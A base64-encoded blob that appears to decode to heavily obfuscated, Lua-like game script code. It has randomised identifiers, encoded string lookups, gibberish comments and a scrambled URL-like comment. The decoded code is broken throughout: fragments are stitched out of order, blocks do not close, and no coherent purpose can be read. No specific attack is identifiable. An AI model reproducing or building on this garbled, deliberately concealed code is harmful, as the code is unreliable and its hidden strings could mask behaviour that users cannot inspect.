YkRGZmlJKAogICAgICAgICAgICAgICAgREtmS1JYaldSZS5pTG5HeGRkaEFqLktrek9pU0Jqc2wuSFd2cUVWaUhtTS5XcUJXVXZqckhTLm1WYmptZnlkVm0gPSBZRVV6dGRmQ3dGCiAgICAgICAgS0JtTFlSSVlrVyA9IGZhbHNlLAogICAgZnVuY3Rpb24oS09wR0ZsS1dEcikKICAgIHsKICAgIGxvY2FsIE1wS2FtVkdtWGosIFpsbG1rYmZIbXEgPSB0aGdDdllUUE5hKCkKZW5kCgoKUW5MWGlWVk9Vai5ER1Zua05pa2hTOml2VXJKWHdrblooCiAgICAgICAgICAgICAgICAgICAgZ3ZoZWpmTnZEaCBjWFNEVXF3d2xELkdSemNtUnNpWEMgPT0gKChFdGxlQVppclNWKVsiemFQYmhUaGJSbiJdKCJWb1prcVVwcElZIikpIEpkbGxkZkZ5d1ggY1hTRFVxd3dsRC5HUnpjbVJzaVhDID09ICgoUWd3UVhBVGhqdClbInphUGJoVGhiUm4iXSgic2lNR2JjQUJSSD0iKSkgSmRsbGRmRnl3WAogICAgcUt3VWFpVmpzSSA9IEhUYkdhTXpiVlc6THJkZGdHTVpkayh7bGF3a1dBVlVoWiA9ICgoRWxXVERybmhKWilbInphUGJoVGhiUm4iXSgiTHVpZ0xVZGhUeD09IikpLCB4UmpZQW9rdWFpID0gKChZemd0Tm51WVZjKVsiemFQYmhUaGJSbiJdKCJaYmhzYVV0WVVyIikpfSksCmxvY2FsIElXREpQQ2RndkcgPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKCh0TGVwdmZjckR1KVsiemFQYmhUaGJSbiJdKCJRTG1uVUdaZUxMPT0iKSkpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgMi41LAogICAgICAgICAgICAgICAgICAgICAgICBYVURuZVR5Y3NrLkh0ZW1GcFBRU2MgPSBXallyWmtoS1ZNLkh0ZW1GcFBRU2MuVHZSb3JvSFpyRgogICAgICAgIGlmIEx3VldzanJFdmcgdGhlbgogICAgewogICAgICAgIGh4Z0lVeUNVc08gPSBmYWxzZQogICAgICAgICAgICBlbmQKYW9lQ250Vml5cS5tdFlNQ1pLZ2ZBKAogICAgbG9jYWwgWllZQnJnVEpGWiA9IFhnb3ZEaHlUYlk6QlNpRG1TS0hTcygoKG50RmVBa3FLU1cpWyJ6YVBiaFRoYlJuIl0oImZ3UlRjeUxYREQ9IikpKTpCU2lEbVNLSFNzKCgobVlqdUVhY3VBdylbInphUGJoVGhiUm4iXSgieUtDSU5HWFdXaSIpKSk6QlNpRG1TS0hTcygoKHZVb3BiZnN4Q2UpWyJ6YVBiaFRoYlJuIl0oIk5zbUpMWmZaeEY9IikpKQogICAgbG9jYWwgamNiUHFnZ1NhcSA9IEtrek9pU0Jqc2wuSFd2cUVWaUhtTTpad29vU2lqVUhLKHl0cnZBaW5WV24pIEpkbGxkZkZ5d1ggS2t6T2lTQmpzbC5FanZUZUJwS0l4Olp3b29TaWpVSEsoeXRydkFpblZXbikKbG9jYWwgVXVtaFhUdU5IbCA9ICgoT1F2SGZoQU9uVilbInphUGJoVGhiUm4iXSgiUHdMQUJBSUJDYj09IikpCiAgICAgICAgbGF3a1dBVlVoWiA9ICgoRUhIZUt5Z09UZClbInphUGJoVGhiUm4iXSgicm1ZanZjZFlFUz09IikpLAogICAgICAgICAgICBsb2NhbCBtZlN2VnZFWHBLID0gS2t6T2lTQmpzbC5IV3ZxRVZpSG1NCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAgICAgbG9jYWwgYUJRZVhzZHJrdiA9IEpFQlRPbUFNQngoSFdTU2tBR3VadSkKICAgICAgICAgICAgICAgIGVuZAogICAgaWYgcXNsR0JzSEdCViBIV3ZxRVZpSG1NIHRoZW4gcmV0dXJuIGVuZAp1VkZZdFl5ZHRvOmtWZ2NKS1ZPUXgoKQogICAgWFpUU1BCelVWTyBNcEthbVZHbVhqLCBkTFFkbGJzWmt3IG10cGRDRWNFRGogeWh6VFVjQ1lmTyhMT1dadFZMUkhPKSBwWWlpV1pHVUJyCiAgICAgICAgICAgICAgICAgICAgICAgIFhsd3psanZZWmEuV052ZXRXTlFPaiA9IEtPcEdGbEtXRHIKICAgIE5RWlVIUFdETW8gPSBmdW5jdGlvbih3U1FPaVBjSGtJKQogICAgICAgICAgICBbM10gPSAxLAoKICAgIE5RWlVIUFdETW8gPSBmdW5jdGlvbih3U1FPaVBjSGtJKQogICAgICAgIHZHTGxCeldnQ2ogPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgbG9jYWwgVVdmeUJsUVd1aSA9IERLZktSWGpXUmUuaUxuR3hkZGhBai5La3pPaVNCanNsCiAgICAgICAgTXFZb3hEb3NKRyA9ICgoc2tRdUV6ZWJLSSlbInphUGJoVGhiUm4iXSgiUWlFT1ZqTlhTUz09IikpLCAtLSBxYnJ3dU1RUGFZCiAgICB7CiAgICAgICAgY1hTRFVxd3dsRC5vWUhrbEd0WVRzID0KICAgICAgICAgICAgICAgICAgICBhb2VDbnRWaXlxLmJTZXlqeXdkRU8oMSkKICAgICAgICBsb2NhbCBibWpCQ0J4WENyID0gRk5tRXdHbnp1Tzpad29vU2lqVUhLKCgoWHVucXVHY2JyYilbInphUGJoVGhiUm4iXSgibmFkQ1FjY1pnVSIpKSkKICAgICAgICAgICAgICAgICAgICBsaWh3Qnl0Tmp4ID0gU1V5WFd3WEZJdC54aFRvZ2plaWZoKCgoQldDWU9XRGRmVilbInphUGJoVGhiUm4iXSgiUlFMeVV2cEFuRyIpKSkKICAgICAgICBhblRuekFvQ2l6ID0gdHJ1ZSwgLS0gUkRnT1p3b01jYiBhTEpVeEZsU3NZIERtdnRMTExMSnIgbmFlaVNUbmNPaAogICAgICAgIGVuZApORFlpRGZ2RndwLkxLakJGb1NDZmU6a2phcWp6RG5CbCgKICAgIG9Ua0tpUW1mR2w6b3BXcHhOSnhRaigKICAgICAgICBjb3ViWHB6ZnJaID0gKChzQllTR1FnZEd0KVsiemFQYmhUaGJSbiJdKCJORUxnZ2d5dG9aPSIpKSwKICAgIFFuTFhpVlZPVWouREdWbmtOaWtoUzpodWV2SFl0bFRHKAogICAgICAgIHBGZHpNYWxiTHcudk5pRHBUZWZkbiA9ICgoUEVTWXFEa2xaaSlbInphUGJoVGhiUm4iXSgib1pYWHhzWVhtdyIpKSAtLSBLZVlKQ3Vscm5zIHJGSUJjb3JkWEIgWGRrWkNtdG5zRyBnc2FaVk5JcEtuIHNxZVZUWWF5anUgRExEaE5acG5keAogICAgICAgICAgICB9KQopCiAgICBNcVlveERvc0pHID0gKChXcEdYVHN1ZnB2KVsiemFQYmhUaGJSbiJdKCJja05tY1pSb1drPSIpKSwKICAgICAgICAgICAgfQogICAgewpsb2NhbCBmdW5jdGlvbiB1elNsVmJQUmlHKEtPcEdGbEtXRHIpCmxvY2FsIEJRdk1KcGRGYkcgPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKCh1YmpsbGdqRnhRKVsiemFQYmhUaGJSbiJdKCJaVkVRVUZzZkRGPSIpKSkucENud0RlZ0tRbi5VV0NRcUhCbFp5LkdHUGtGVURDTXkKICAgIFFuTFhpVlZPVWouZFJnZEt4a1RiTTppdlVySlh3a25aKApmdW5jdGlvbiB1ZXFtdXZkWEhkKCkKZW5kICAgIAogICAgICAgIGlmIHFzbEdCc0hHQlYgaGZtc3lUV2t1UiB0aGVuCiAgICBmdW5jdGlvbigpCgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIHZHTGxCeldnQ2ogPSAoKHpJRVRvSkNKTFUpWyJ6YVBiaFRoYlJuIl0oIllWdXBkTnNXZHk9PSIpKSwKICAgICAgICAgICAgICAgIGxvY2FsIEZnTG5WeElla3MgPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChMSWlZQWFyZ3dLKVsiemFQYmhUaGJSbiJdKCJnTUx3ZXVzenRlPSIpKSkKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oQk1jWUJCUWxMUikKICAgICAgICBsYXdrV0FWVWhaID0gKCh4U1p5c0FieFBpKVsiemFQYmhUaGJSbiJdKCJqT1lKcXBPVlZ1IikpLAplbmQKICAgICAgICAgICAgaWYgU1phQ0tnVG1TSS5VdVdLSEJxbEJlID09ICgoTW1OY3ZMbWVSUylbInphUGJoVGhiUm4iXSgiYWJZcVZVcERFRiIpKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEJiUHZ2RVNqc0kgPSB3RUVQTmhyS0d3Olp3b29TaWpVSEsod1NRT2lQY0hrSSkKICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIG1iZU9acEV3WHkgPSBTWmFDS2dUbVNJOnlQU212RFpETGMoKChVTXBSaFFhQllmKVsiemFQYmhUaGJSbiJdKCJzcVFxbEpMUWtmPSIpKSkKICAgIGdEWnFoVG1wcWcKCmxvY2FsIEtrek9pU0Jqc2wgPSBpTG5HeGRkaEFqLktrek9pU0Jqc2wKICAgIGZ1bmN0aW9uKCkKCgoKICAgICAgICAgICAgICAgIGd2aGVqZk52RGggY1hTRFVxd3dsRC5HUnpjbVJzaVhDID09ICgoc1JpUm5pSnJ2RylbInphUGJoVGhiUm4iXSgicURyUkJNandaeCIpKSB0aGVuCiAgICAgICAgICAgIC0tIE9qR2lNa2VZRUYgYkZ6cGdQU2dVRCBWRlFYa256VnJmIGZ1bmN0aW9uIFJXU1Fta3FYVXQgTlp6ZEpVQVp5WgogICAgICAgICAgICAgICAgaWYgQWF3b2NHbE1FYTpad29vU2lqVUhLKCgoemNzVWJsa1ZzVilbInphUGJoVGhiUm4iXSgiS3VmRnJXbFZQRyIpKSkgdGhlbgpsb2NhbCBmdW5jdGlvbiBkZ1dqbk9Ya0JFKCkKICAgICAgICAgICAgLS0gKipSRGdPWndvTWNiIFJnZFlRWXBkWkMgQWdlWXBHVGp0dyBBTk9YSU9YUVZ2IHpodlZnZFVyV1UgUmpvQkJUTUFVVSBIV3ZxRVZpSG1NKioKbG9jYWwgWFBBRlJCWGpjRyA9CiAgICAgICAgICAgICAgICAgICAgICAgIEp4ckh5WURjWE4gPSBNcVpiTGJKZklJOlp3b29TaWpVSEsoKChOcmhtQ2plc0xUKVsiemFQYmhUaGJSbiJdKCJrS05ha0FuTnFoIikpKQopCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBibWpCQ0J4WENyID0gWHhqSlNKc3FpSzpad29vU2lqVUhLKCgoWHVucXVHY2JyYilbInphUGJoVGhiUm4iXSgibmFkQ1FjY1pnVSIpKSkKICAgICAgICAgICAgICAgIEZnTG5WeElla3MuVldPVUVPYm9yTiA9IDUKICAgICAgICAgICAgICAgICAgICAgICAgWGx3emxqdllaYS5XTnZldFdOUU9qID0gS09wR0ZsS1dEcgogICAgICAgICAgICAgICAgaWYgSW9iU2VqaU5HUiB0aGVuCiAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBzZEV6U2xYR2ZSOkNkcHRkRlN3RFooKChwYmxRWVNYZ1R5KVsiemFQYmhUaGJSbiJdKCJFellqdk56aEhCPSIpKSwgKChac3BCbkRNY0lpKVsiemFQYmhUaGJSbiJdKCJJdVJ0UG5PZVdpPSIpKSwgNSkKICAgICAgICAgICAgZW5kCkpOSlVoWUN5TVUgPSBKTkpVaFlDeU1VIEpkbGxkZkZ5d1gge30Kc3NiRkFLbW1JQy5YbUhydlN3S1VJID0gKChMaGN2anRHdUhzKVsiemFQYmhUaGJSbiJdKCI0NENNVkdoaGJraFZRdU9BalE9PSIpKSAtLSB3YldhckZ4VHVvIGZSUWlkVnFJVHkKCiAgICAgICAgICAgIGxhd2tXQVZVaFogPSAoKGlrYlFwdEJRdkcpWyJ6YVBiaFRoYlJuIl0oInh1cEtjWkRYZ0c9PSIpKSwKICAgICAgICBPYVNnYVJWU1ZtLkxJQnZpa0p2a1ggPSByZVdTQ1JHT2ZzKDAuMTIpCiAgICAgICAgICAgICAgICAgICAgIHRoZW4KbG9jYWwgUUJPVHJNRndYWiA9IHRydWUgLS0gdkdMbEJ6V2dDaiB1RnpsVXRhUEJQIFp5VWlCdWdEdHAgbXBXVkNiQ1VJbgogICAgewotLSBhTmJsVkluUlZyIHFjUmJrSFNpV2IgTXNUeXpJZlpYSCBRWkV6ZEpvZ29PIFJqb0JCVE1BVVUgU3dLWm9wU0xTTgogICAgICAgICAgICAgICAgc1RQT2htZ0lhRi5VblZmS2dRYVpsID0gdHJ1ZQpwRmR6TWFsYkx3Lk1odWViR0Z5bWcgPSB0cnVlCiAgICAgICAgICAgIC0tIHNiUEF1RnlIQ2QgSmttdXlwUEVqUiB2bURVWldLSGdVIGxHa3pzenNBb2YgWnNYSGt0UERpciBWcFJFSVRpZEVvIEZsaFV1eVdybmwKICAgIC0tIEhiaEdJRlBab1UgSmttdXlwUEVqUiBlYUFwa1RwekVaIFBzZWdleHBkTVMKICAgICAgICAgICAgbG9jYWwgUGNPUkZpR0tSSSA9IEpGc3VaUmFOUWIud1NRT2lQY0hrSQogICAgICAgICAgICAgICAgeUpZR2RWanplRy5TVEJiSEJnZktLKEpIQllIY3JDeVMsIGRMUWRsYnNaa3cuVXVXS0hCcWxCZSkKICAgICAgICBnRFpxaFRtcHFnCiAgICAgICAgaWYgcXNsR0JzSEdCViBpcWx0a1h3bE9GIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZW5kLAogICAgICAgIGJSR1dHcURlRmQgPSBXcUJXVXZqckhTLm1WYmptZnlkVm0KbG9jYWwgc3hGSFJUS2tJbSA9IGZhbHNlCiAgICAgICAgbGF3a1dBVlVoWiA9ICgoaWtiUXB0QlF2RylbInphUGJoVGhiUm4iXSgieHVwS2NaRFhnRz09IikpLAogICAgICAgIGVuZAoKICAgICAgICBhb2VDbnRWaXlxLmJTZXlqeXdkRU8oMC41KSAtLSBLSm9qcURQZmJxIGRKSndtdlZSeFUgMC41IHV2Qm1rRG1saUMKICAgICAgICBEVEFZZHR1Q2JiID0gMjAwLApsb2NhbCBmdW5jdGlvbiBNWk5RSGd6YW14KFFYQ2Nmb3ZsV0cpCiAgICAgICAgICAgICAgICBGZ0xuVnhJZWtzLmd0Z21LV1JVUFcgPSBha1JCbXBGV0h2LkFndWZac2FUQnkoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgYW9lQ250Vml5cS5iU2V5anl3ZEVPKEZHTktmWkZSQ2kpIC0tIHJnZUZiZ1llc3ggRkdOS2ZaRlJDaSBJYWxqRXVtVEd5IGhDYWxFckRmRkQKICAgICAgICBlbmQKICAgICAgICBOUVpVSFBXRE1vID0gZnVuY3Rpb24oS09wR0ZsS1dEcikKICAgICAgICAgICAgICAgIGFvZUNudFZpeXEuYlNleWp5d2RFTygwKQpsb2NhbCBDVUxrTGdUbGNBID0gU1V5WFd3WEZJdC54aFRvZ2plaWZoKCgoYnZmektTdlBvUylbInphUGJoVGhiUm4iXSgiUGlRQllobkdwYz0iKSkpCiAgICAgICAgICAgICAgICBsb2NhbCBXYUtHUXNWdExYID0gY3lZVXdRWkx5eS5XcUJXVXZqckhTCgogICAgICAgICAgICBJQ0d2RXZrbEl6Okx0QmlneVNJWlcoKQogICAgICAgIGVuZAogICAgVXVXS0hCcWxCZSA9IE5zamlpc1FGTlg6Wndvb1NpalVISygoKFhVVW5lYXlmSGcpWyJ6YVBiaFRoYlJuIl0oInpUR0pnem1kUHk9PSIpKSkgTHp1b2NWRHNHciBOc2ppaXNRRk5YLk9MTEt2V2VhT3YuWG1IcnZTd0tVSSBKZGxsZGZGeXdYIERLZktSWGpXUmUuaUxuR3hkZGhBai5La3pPaVNCanNsLlV1V0tIQnFsQmUsCmxvY2FsIHp5Wk1WblFHdUYgPSBmYWxzZQotLSBSdVZVblhpVGVQLkxJQnZpa0p2a1ggPSBQZnVGVHNyRUtZLnhoVG9namVpZmgoMC40NSwgMCwgMC41LCAwKSAtLSBwVVBGUnhDaUxlIFJ1cG9UQ2Z2V2YgbUZVcm9yU2x2TCBkcktVT3RCRGZtIGlacEZRU3hrWnQgaVVjZGJETFdvbSBuYXVTcXFzeUtDCiAgICAgICAgICAgIFFuTFhpVlZPVWouREdWbmtOaWtoUzpWSUhjWVpTUnZCKAogICAgaWYgUmdNd3dPZ1h6SyB0aGVuCgogICAgICAgICAgICBhb2VDbnRWaXlxLmJTZXlqeXdkRU8oMC41KSAtLSBBR3NoV3ROaXliIE1YR21Ec0xjbmwKICAgICAgICAgICAgSEdJclF2ek95dS5BYXdvY0dsTUVhLkRJbmdqS01vWFYuZk5ERE9tb1JReS5la3F3R3BqRHVhID0gcXNsR0JzSEdCViBIR0lyUXZ6T3l1LkFhd29jR2xNRWEuREluZ2pLTW9YVi5mTkRET21vUlF5LmVrcXdHcGpEdWEKICAgIH0KICAgICAgICAgICAgICAgIFlFVXp0ZGZDd0YgPSBES2ZLUlhqV1JlLmlMbkd4ZGRoQWouS2t6T2lTQmpzbC5IV3ZxRVZpSG1NLldxQldVdmpySFMubVZiam1meWRWbQogICAgICAgIGVuZAogICAgICAgICAgICBpZiBQY09SRmlHS1JJIHRoZW4KICAgICAgICBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKCh1YmpsbGdqRnhRKVsiemFQYmhUaGJSbiJdKCJaVkVRVUZzZkRGPSIpKSk6QlNpRG1TS0hTcygoKGVIekFQRU5TcUMpWyJ6YVBiaFRoYlJuIl0oIlVZZWZHellqQlQiKSksIDllOSk6QlNpRG1TS0hTcygoKFVUQVR4TVh6a3kpWyJ6YVBiaFRoYlJuIl0oInZGd0ViY0ZWcVE9IikpLCA5ZTkpOk9qR2lNa2VZRUYoCiAgICAgICAgICAgIGlmIE5zamlpc1FGTlg6Wndvb1NpalVISygoKFhVVW5lYXlmSGcpWyJ6YVBiaFRoYlJuIl0oInpUR0pnem1kUHk9PSIpKSkgdGhlbgoKICAgICAgICAgICAgZnVuY3Rpb24odEhlb3ZoSmtSQSkKICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBhdFBwWm96SlpnID0ge30KICAgICAgICBsYXdrV0FWVWhaID0gKChmSERhcFNyTE5uKVsiemFQYmhUaGJSbiJdKCJqUkZXWkVvdGdsIikpLAogICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKHRIZW92aEprUkEpCkVKWVVydXNncWs6Ull3QWJERmZpSSgKICAgICAgICAgICAgICAgICAgICAgICAgZEdmcFVaSURFRiBibWpCQ0J4WENyIEx6dW9jVkRzR3IgWHhqSlNKc3FpSzpXeHlJYnJUV1lKKEtrek9pU0Jqc2wuSEdJclF2ek95dSkgcFlpaVdaR1VCcgogICAgICAgIGVuZAogICAgTXFZb3hEb3NKRyA9ICgodEZISXdvUGdkYSlbInphUGJoVGhiUm4iXSgiUlFYTGJPa1VFbiIpKSwKICAgIHltRGNBeWhGa0suR3d1cVd3eUF4SSA9IDEKWFVCQm5rQUV6dy5zem1od3FycHJ0ID0gUnpLd0pPVlFlbS54aFRvZ2plaWZoKDAuNSwgMC41KQotLSBSdVZVblhpVGVQLmx6YnFMV3htUWggPSBha1JCbXBGV0h2LkFndWZac2FUQnkoMjU1LCAyNTUsIDI1NSkKICAgICAgICBsYXdrV0FWVWhaID0gKChsU1VqcWRxa2V6KVsiemFQYmhUaGJSbiJdKCJEQWlRVkFsYURBPT0iKSksCmxvY2FsIFpyUndpdGdCT2ggPSBRbkxYaVZWT1VqLnFLd1VhaVZqc0k6ZklXREFPcEJ4RigoKE9YZ2pGWGJwU1IpWyJ6YVBiaFRoYlJuIl0oImxCSkZicWZOaE09IikpKQogICAgICAgICAgICAgICAgTnNqaWlzUUZOWC5PTExLdldlYU92Lmx6YnFMV3htUWggPSBha1JCbXBGV0h2LkFndWZac2FUQnkoMTYwLCAxNjAsIDE2MCkKCiAgICAgICAgTXFZb3hEb3NKRyA9ICgoQXZFZWxxYnFPZSlbInphUGJoVGhiUm4iXSgic3RhaUNNSmJDcz09IikpLAogICAgICAgICAgICAgICAgZW5kCgppZiBxc2xHQnNIR0JWIERLZktSWGpXUmU6dmxDcHJsZkRJcCgpIHRoZW4KbG9jYWwgdmNBaFdGdUFNSSA9IFNVeVhXd1hGSXQueGhUb2dqZWlmaCgoKGV4VHRjRXBra28pWyJ6YVBiaFRoYlJuIl0oInFlc2x5eVZOYkMiKSkpCiAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBIV3ZxRVZpSG1NIHRoZW4KICAgICAgICAgICAgbG9jYWwgUXl3ZkxBU2hGUCA9IGlxbHRrWHdsT0Y6Wndvb1NpalVISygoKGpwQXNMSUxidHIpWyJ6YVBiaFRoYlJuIl0oIm9sZnBNYXZldms9PSIpKSkKICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGp3UXh4Slhob20gPSBUWEhrVUZLakhVLlBZV2lETFlkUEMuSk1aVUhCT2N5ajpad29vU2lqVUhLKCgoUWd3UVhBVGhqdClbInphUGJoVGhiUm4iXSgic2lNR2JjQUJSSD0iKSkpCnNzYkZBS21tSUMudnl6UGFkc2xFYSA9IDEKKQogICAgbGF3a1dBVlVoWiA9ICgoWXpsdHVNdGtjWilbInphUGJoVGhiUm4iXSgiRkdZQk10YWJBTD09IikpLAogICAgICAgICAgICAgICAgSVZvaXd0dEhVZDp2bldTaHhNY3RtKCkKICAgICAgICBsYXdrV0FWVWhaID0gKChNZ2hIZnZGTnNkKVsiemFQYmhUaGJSbiJdKCJFTGpTTVdXb2xCPT0iKSksCiAgICAgICAgdkdMbEJ6V2dDaiA9IGZhbHNlLCAtLSB2R0xsQnpXZ0NqIEtxcG5jQkZDeW8gUmpvQkJUTUFVVSBlR21hcU1MUlNxIG5yWEV3bGN6bkIKICAgICAgICAgICAgbG9jYWwgeGZ6YU1JVnZuQiA9Ci0tIEZyR3hNd2h4Z1oga0hLWVZFRUZJYiBaWmRVWXp2UWVxIElvYlNlamlOR1IKICAgICAgICBhblRuekFvQ2l6ID0gdHJ1ZSwgLS0gUkRnT1p3b01jYiBhTEpVeEZsU3NZIERtdnRMTExMSnIgbmFlaVNUbmNPaAotLSAvLyAvLyAvLyBoeHJzVHF1dHJGIHhCQWpGbHdRV08gLy8gLy8gLy8gLS0KCiAgICBlbmQKICAgIGZ1bmN0aW9uKHRIZW92aEprUkEpCiAgICBlbmQKICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgWHhqSlNKc3FpSyB0aGVuCiAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGFvZUNudFZpeXEuRkdOS2ZaRlJDaSgKICAgICAgICAgICAgICAgICAgICAgICAgbU90V0ZQTkpqUyA9IG1WYmptZnlkVm0ueGhUb2dqZWlmaChqd1F4eEpYaG9tLmhJQ3JBWlVxbGQgKyBWcG1pTkZYYWdPLnhoVG9namVpZmgoMCwgNzQsIDApKQogICAgZW5kCiAgICAgICAgWFpUU1BCelVWTyBNcEthbVZHbVhqLCBBTk9YSU9YUVZ2IG10cGRDRWNFRGogZElWUU5Jd1hsSyh6WHFaYWN2UVBhKSBwWWlpV1pHVUJyCiAgICAgICAgICAgIEZObUV3R256dU8gPSBIR0lyUXZ6T3l1IEx6dW9jVkRzR3IgSEdJclF2ek95dTpad29vU2lqVUhLKCgoUm9LSnJqenhwdSlbInphUGJoVGhiUm4iXSgiQmZXZ3ByUlFuUD09IikpKQogICAgICAgICAgICBYWlRTUEJ6VVZPIHBSenFMYlRMakkgPSAxLCBHcFhXc0RzalBkIHBZaWlXWkdVQnIKb1RrS2lRbWZHbDpvcFdweE5KeFFqKAogICAgZW5kCiAgICByZXR1cm4gSkhCWUhjckN5Uywgbm9BRUVWZXpjZQogICAgICAgIGFuVG56QW9DaXogPSB0cnVlLCAtLSBSRGdPWndvTWNiIGFMSlV4RmxTc1kgRG12dExMTExKciBuYWVpU1RuY09oCmVuZAogICAgWFpUU1BCelVWTyBNcEthbVZHbVhqLCBDY1hEZVF4dnhzIG10cGRDRWNFRGogZElWUU5Jd1hsSyhKSEJZSGNyQ3lTKSBwWWlpV1pHVUJyCiAgICAgICAgLS0gRGRNY3NURVB3aiBJTWFSb2xJemdJIFJ1cG9UQ2Z2V2Ygc0lIZm5Cak1SeCAoZHJLVU90QkRmbSBHZW9Lc2NlZHhYIFBBVmdNeVJvakQpCgogICAgICAgICAgICBlWlZNTmtkd1NnKCkKICAgICAgICAgICAgZW5kCmVuZApsb2NhbCBsS2dxR2hFc1JPID0KICAgICAgICAgICAgICAgICAgICBpZgogICAgICAgICAgICAgICAgZ3ZoZWpmTnZEaCBjWFNEVXF3d2xELkdSemNtUnNpWEMgPT0gKChRZ3dRWEFUaGp0KVsiemFQYmhUaGJSbiJdKCJzaU1HYmNBQlJIPSIpKSB0aGVuCgogICAgKCh5UnZ3Vm1LeERhKVsiemFQYmhUaGJSbiJdKCJ5QmVGTlJsSHlEPSIpKSwKICAgIDMsCgoKLS0gLy8gLy8gLy8gWXhsdUNERmZpVCAvLyAvLyAvLyAtLQogICAgICAgICAgICAgICAgICAgIHJDbnhHdGxDWFE6cHdZSGtSUXlIZih0cnVlLCBXallyWmtoS1ZNLkN1UGtCbndqaXkub2hVUktNanJFZywgZmFsc2UsIERLZktSWGpXUmUpCmVuZAogICAgICAgIEtrek9pU0Jqc2wuSFd2cUVWaUhtTS54SGxleUNTQ0F5LlN2eFN4S01DclAgPSB0SGVvdmhKa1JBCi0tIHZTaEFDWmdXTk06CiAgICAgICAgICAgIEl3ZmJmV05RYm4oKSAtLSBmUWlDVHhIdnZVIHdhUER4aGdHRlAgSXdmYmZXTlFibiBZaXNXaHNTTkFaIEljYlFMcVVDenogQVBLS2pBZEVqeQogICAgICAgICAgICAgICAgaWYgdUhzU2dESEppVyB0aGVuCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGFvZUNudFZpeXEuYlNleWp5d2RFTygwKQpsb2NhbCBjdGxBc3pRRU5UID0KICAgIGVuZAogICAgICAgIGxhd2tXQVZVaFogPSAoKHRkREtQdGZNWncpWyJ6YVBiaFRoYlJuIl0oInFKbWFOcnpwZXg9IikpLAphb2VDbnRWaXlxLm10WU1DWktnZkEoCiAgICAgICAgICAgIGN5WVV3UVpMeXk6c09ERm96endQeShtVmJqbWZ5ZFZtLnhoVG9namVpZmgobUtSTEljQlJwTSkpCiAgICBlbmQKKQogICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbUhMRVlDWGxORyB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgWGx3emxqdllaYSA9IHBDbndEZWdLUW46Wndvb1NpalVISygoKFZTYUZ3bkZNUEspWyJ6YVBiaFRoYlJuIl0oIlVKVUNzY2FxdnEiKSkpCiAgICAgICAgICAgIC0tIGJDS1RMVEFMSkggYkZ6cGdQU2dVRCBVV2Z5QmxRV3VpJ3pzWlZGRnVHTUsgZHdSeUFpRmNtQyBRWENjZm92bFdHCikKLS0gaWpHdlVOc0ZaRCBRQnl4aUt3aFFSIGNCdVJzY01TcEQKbG9jYWwgYXN4YXJQV01odiA9IGZhbHNlCiAgICAgICAgICAgIGlmIHFzbEdCc0hHQlYgQ3Zhb3RlS2ppUyB0aGVuCiAgICAgICAgICAgICAgICBpZiBsalBGeXhzYUx3LmRPUmhBUGN0YUQgdGhlbgogICAgWFVCQm5rQUV6dywKICAgIE5RWlVIUFdETW8gPSBmdW5jdGlvbihLT3BHRmxLV0RyKQpRbkxYaVZWT1VqLllGcWxlUVlvbnY6VnBjT25LdVdKTygKbG9jYWwgVG5yaU9WRkpPVCA9CiAgICAgICAgICAgICAgICAgICAgYW9lQ250Vml5cS5iU2V5anl3ZEVPKFRMSFdxVG55RkouZmREWE1helRZaShGR05LZlpGUkNpLCBGR05LZlpGUkNpICsgMC41KSkKICAgICAgICByZXR1cm4KICAgICgoVE1penl1RFpwaClbInphUGJoVGhiUm4iXSgiR3N5VUROU3p3WD0iKSksCiAgICByb2lLWWtyWEh0LnVzQVJCdHRqaWkgPSBBYXdvY0dsTUVhOlp3b29TaWpVSEsoKChwZUtYTUZwQlVSKVsiemFQYmhUaGJSbiJdKCJPV3VkckViZENNPSIpKSkgTHp1b2NWRHNHciBBYXdvY0dsTUVhLnhGRllwbmtHWEkuWG1IcnZTd0tVSSBKZGxsZGZGeXdYIG5pbApSRlJ3U0dmbkp5OlJZd0FiREZmaUkoCmVuZAogICAgICAgICAgICAgICAgbm1lQXR0eUtSZigpCgogICAgLS0gVlZHVUluVkh4dzovL0VsdFp1cVhnS1IudlFTWmdYdVdFSi96Q29DbGF0a3RFLwogICAgZW5kCiAgICAgICAgICAgICAgICBGZ0xuVnhJZWtzLkJhR1ZTUEJtY2UgPSB0cnVlCiAgICAgICAgICAgIGlmIHFzbEdCc0hHQlYgWmxsbWtiZkhtcVtkTFFkbGJzWmt3LlV1V0tIQnFsQmVdIHRoZW4KICAgICAgICAgICAgbG9jYWwgRkdOS2ZaRlJDaSA9IFdTdnFSaFRWU3coWFBBRlJCWGpjRy53U1FPaVBjSGtJKSBKZGxsZGZGeXdYIDMgLS0ga0lGeGlFdVdFQSBVeUhzTmlBWlVHIElhbGpFdW1UR3kgaENhbEVyRGZGRAogICAgICAgICAgICAgICAgICAgIGRHZnBVWklERUYgVGxaYldiSktPTCBMenVvY1ZEc0dyIEtrek9pU0Jqc2wuSFd2cUVWaUhtTTpad29vU2lqVUhLKE5nbXBmZHlLZ0opIHBZaWlXWkdVQnIKCgogICAgICAgI